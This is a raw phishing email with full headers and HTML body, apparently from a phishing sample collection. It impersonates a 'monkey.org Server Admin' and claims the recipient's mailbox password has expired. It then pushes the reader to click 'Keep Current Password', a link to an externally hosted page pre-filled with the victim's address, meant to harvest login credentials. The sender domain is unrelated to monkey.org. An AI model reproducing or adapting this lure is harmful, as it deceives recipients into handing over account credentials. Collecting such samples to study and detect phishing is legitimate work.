@@ -1,0 +1,245 @@
+From jose@monkey.org Wed May 31 12:35:54 2023 +0000
+Return-Path: masroori.abolfazl@kplusi.ir
+Delivered-To: jose@monkey.org
+X-FDA: 80850497028.12.1FFA035
+Received: from mail.kplusi.ir (mail.kplusi.ir [82.99.199.99])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id DCD5B12001B
+	for <jose@monkey.org>; Wed, 31 May 2023 12:35:51 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=none) header.from=kplusi.ir;
+	spf=pass (imf29.b.hostedemail.com: domain of masroori.abolfazl@kplusi.ir designates 82.99.199.99 as permitted sender) smtp.mailfrom=masroori.abolfazl@kplusi.ir
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1685536552;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=Rd4ujHqaowVWNXOs8fuHn8Ow+tDUnxvH4reXRrRoYBM=;
+	b=3Ex8tO0WtjC7oVL1cTLdoVb9OJCIwr9k5ir52wa6Itc1ZI+t0+/3OrBtgYY01k916VOQok
+	faQAXG7XlDTc9+uUgHLe6VexDY2bE0zI6d3KAdeA9eEAiuW5t0hgc6YZYyAc/1PE91uZZG
+	Gx6MvjRCbmIzC9A6uZ9I+IgRZK/5ONU=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=none) header.from=kplusi.ir;
+	spf=pass (imf29.b.hostedemail.com: domain of masroori.abolfazl@kplusi.ir designates 82.99.199.99 as permitted sender) smtp.mailfrom=masroori.abolfazl@kplusi.ir
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1685536552; a=rsa-sha256;
+	cv=none;
+	b=oezXoxYOUJOvxnLrIlypSF/jbqj/pfDsTtuOQZHILnZbAqI93XDWfnGvYZZXWTQtsC+Ru2
+	EV6pr1dLOT+nLI6bTG8Tg9KZDEXJGAohbiZOVLFWMSHawAegdRyUTp0BvmgiBTnZRjyYD1
+	cAKe1shidBqfgsy/+2GAo+RNcNK5a9s=
+Received: from localhost (localhost [127.0.0.1])
+	by mail.kplusi.ir (Postfix) with ESMTP id 7CFFF3E367EA
+	for <jose@monkey.org>; Wed, 31 May 2023 17:05:48 +0430 (+0430)
+Received: from mail.kplusi.ir ([127.0.0.1])
+	by localhost (mail.kplusi.ir [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id mq_LP1tqePLR for <jose@monkey.org>;
+	Wed, 31 May 2023 17:05:47 +0430 (+0430)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.kplusi.ir (Postfix) with ESMTP id D41A33E441CF
+	for <jose@monkey.org>; Wed, 31 May 2023 17:05:47 +0430 (+0430)
+X-Virus-Scanned: amavisd-new at mail.kplusi.ir
+Received: from mail.kplusi.ir ([127.0.0.1])
+	by localhost (mail.kplusi.ir [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id QpsBRum40S7B for <jose@monkey.org>;
+	Wed, 31 May 2023 17:05:47 +0430 (+0430)
+Received: from kplusi.ir (gateway [192.168.10.111])
+	by mail.kplusi.ir (Postfix) with ESMTPSA id DCBBB3E138DE
+	for <jose@monkey.org>; Wed, 31 May 2023 17:05:46 +0430 (+0430)
+From: Server Admin - monkey.org <masroori.abolfazl@kplusi.ir>
+To: jose@monkey.org
+Subject: monkey.org Server - Password Expired
+Date: 31 May 2023 08:35:45 -0400
+Message-ID: <20230531083545.A848F7CB39694A59@kplusi.ir>
+MIME-Version: 1.0
+Disposition-Notification-To: ryaskey@rokelbank.sl
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: DCD5B12001B
+X-Stat-Signature: ypeocfp3ogqutsnmukqoyjxp5jt7dr8t
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.80
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1685536551-324606
+X-HE-Meta: U2FsdGVkX1/ZktTc3pNsCmFV64Giry84WcgT8mtwcMMhqAAng2ZMbupLPUPERG49ELdjaQQM3aUkMQcRyjPdqQRyyBc9DQc2Er2X4PnhDNMIffvPTibVjBiGTyBbQ3YfJRz9dFCIkrucpN8NMcW6bVELIdkEyMTEJMQdMW3h/iDurjr/XWqJ+74ADxXFetXdY5oSJcG/gfjbzZuE1Gs2xXZQzu2LU7+GR5J9It4Vy3tnJVgfqeMe88BGhxxc7imvr6omsH8eQciMvyjRy7pCfaRhaB5KMg/YUoPStoCK0aiucKXoCiTHKSaq74jiFtyDdni1++UvLRN76q4MogfXbRsJAwrQR7n/vX5Hp7Oeq4F9yryynBcZHg==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 144
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV id=3Deditbody1>
+<DIV>
+<TABLE id=3Dv1table1 class=3D"v1x_v1row_mr_css_attr v1x_v1row-3_mr_css_attr=
+" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: norma=
+l; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: norm=
+al; font-variant-numeric: inherit;=20
+font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 widt=
+h=3D"100%" align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE id=3Dv1table2 class=3D"v1x_v1row-content_mr_css_attr v1x_v1stack_mr_=
+css_attr" style=3D"BOX-SIZING: border-box; WIDTH: 640px; BORDER-COLLAPSE: c=
+ollapse; COLOR: #000000; BACKGROUND-COLOR: #ffffff" cellSpacing=3D0 cellPad=
+ding=3D0 width=3D640 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1x_v1column_mr_css_attr style=3D"BORDER-LEFT-WIDTH: 0px; BOX-S=
+IZING: border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: top; BORDER-BOT=
+TOM-WIDTH: 0px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PA=
+DDING-TOP: 0px; BORDER-TOP-WIDTH: 0px" width=3D"100%">
+<TABLE id=3Dv1table3 class=3Dv1x_v1text_block_mr_css_attr style=3D"BOX-SIZI=
+NG: border-box; BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: sans-se=
+rif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR=
+: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: =
+0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FON=
+T-FAMILY: 'Trebuchet MS', 'Lucida Grande', 'Lucida Sans Unicode', 'Lucida S=
+ans', Tahoma, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORD=
+ER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2; PADDING-RIG=
+HT: 0px; font-stretch: inherit">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-ALIGN: center; MA=
+RGIN: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-T=
+OP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline;=
+ BORDER-BOTTOM: 0px; COLOR: #003188; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font=
+-stretch: inherit"><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bo=
+lder">monkey.org Server - Password Expired</STRONG>
+</SPAN></P></DIV></DIV></TD></TR></TBODY></TABLE>
+<TABLE id=3Dv1table4 class=3Dv1x_v1text_block_mr_css_attr style=3D"BOX-SIZI=
+NG: border-box; BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D0 =
+width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: Tahoma,=
+ Verdana, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
+t">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-TOP: 0px; FON=
+T-FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERT=
+ICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #555555; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LIN=
+E-HEIGHT: 1.5; PADDING-RIGHT: 0px; font-stretch: inherit">
+<P style=3D"BOX-SIZING: border-box; TEXT-ALIGN: left; MARGIN: 0px 0px 0px 4=
+0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0p=
+x; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDE=
+R-BOTTOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stret=
+ch: inherit">The password to your &nbsp;mailbox&nbsp;<A href=3D"mailto:jose=
+@monkey.org" rel=3Dnoreferrer>jose@monkey.org</A>
+&nbsp;has expired.</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; TEXT-ALIGN: left; MARGIN: 0px 0px 0px 4=
+0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0p=
+x; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDE=
+R-BOTTOM: 0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stret=
+ch: inherit">System will log you out and generate a new password exactly at=
+ 24 hours from</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; TEXT-ALIGN: left; MARGIN: 0px 0px 0px 4=
+0px"><SPAN style=3D"FONT-SIZE: 14px; COLOR: #6d89bc">1 Jun 2023</SPAN><SPAN=
+ style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FA=
+MILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: =
+0px; COLOR: #6d89bc; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
+t">.<BR style=3D"BOX-SIZING: border-box">
+&nbsp;&nbsp;</SPAN>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp=
+; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbs=
+p;<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; =
+FONT-FAMILY: inherit; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: #6d89bc; PADD=
+ING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; B=
+ORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px;=20
+font-stretch: inherit">&nbsp; &nbsp;<BR style=3D"BOX-SIZING: border-box">Yo=
+u can continue using your current password. Use the button below to keep us=
+ing current password.</SPAN></P></DIV></DIV></TD></TR></TBODY></TABLE></TD>=
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE id=3Dv1table5 class=3D"v1x_v1row_mr_css_attr v1x_v1row-4_mr_css_attr=
+" style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: #2c363a; FONT-STYLE: norma=
+l; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: #f1f4f8; font-variant-ligatures: normal; font-variant-caps: norm=
+al; font-variant-numeric: inherit;=20
+font-variant-east-asian: inherit; font-stretch: inherit; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 widt=
+h=3D"100%" align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE id=3Dv1table6 class=3D"v1x_v1row-content_mr_css_attr v1x_v1stack_mr_=
+css_attr" style=3D"BOX-SIZING: border-box; WIDTH: 640px; BORDER-COLLAPSE: c=
+ollapse; COLOR: #000000; BACKGROUND-COLOR: #ffffff" cellSpacing=3D0 cellPad=
+ding=3D0 width=3D640 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1x_v1column_mr_css_attr style=3D"BOX-SIZING: border-box; BORDE=
+R-TOP: #e5eaf3 1px solid; BORDER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BO=
+TTOM: 0px; FONT-WEIGHT: 400; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING=
+-TOP: 0px; BORDER-LEFT: 0px" width=3D"100%">
+<TABLE id=3Dv1table7 class=3Dv1x_v1button_block_mr_css_attr style=3D"BOX-SI=
+ZING: border-box; BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D=
+10 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; BORDER-RIGHT: 0px; V=
+ERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING=
+-RIGHT: 0px" align=3Dcenter>
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP: #8a3=
+b8f 1px solid; FONT-FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDE=
+R-RIGHT: #8a3b8f 1px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: #8a3b8=
+f 1px solid; COLOR: #ffffff; PADDING-BOTTOM: 5px; TEXT-ALIGN: center; PADDI=
+NG-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: #8a3b8f 1px solid; MARGIN: 0px=
+; DISPLAY: block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #3d60fb; font-stret=
+ch: inherit; border-radius: 4px"=20
+href=3D"https://pub-d0457635bdc04c36bc46f1dbfa3f65df.r2.dev/index.html#jose=
+@monkey.org" rel=3D"noopener noreferrer" target=3D_blank>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FO=
+NT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
+TOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: inline-block; LETTER-SPACING: nor=
+mal; LINE-HEIGHT: 28px; PADDING-RIGHT: 0px; font-stretch: inherit"><STRONG>=
+Keep Current Password</STRONG></SPAN></A></DIV></TD></TR></TBODY></TABLE>
+<TABLE id=3Dv1table8 class=3Dv1x_v1text_block_mr_css_attr style=3D"BOX-SIZI=
+NG: border-box; BORDER-COLLAPSE: collapse" cellSpacing=3D0 cellPadding=3D10=
+ width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: Tahoma,=
+ Verdana, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
+px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inheri=
+t">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; FON=
+T-FAMILY: Lato, Tahoma, Verdana, Segoe, sans-serif; BORDER-RIGHT: 0px; VERT=
+ICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: #393d47; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LIN=
+E-HEIGHT: 1.2; PADDING-RIGHT: 0px; font-stretch: inherit">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; MARGIN: 0px"><STRONG>E=
+mail is generated by monkey.org Email Server for&nbsp;</STRONG><A href=3D"m=
+ailto:jose@monkey.org" rel=3Dnoreferrer><STRONG>jose@monkey.org</STRONG></A=
+></P></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD><=
+/TR></TBODY></TABLE></DIV></DIV></BODY></HTML>
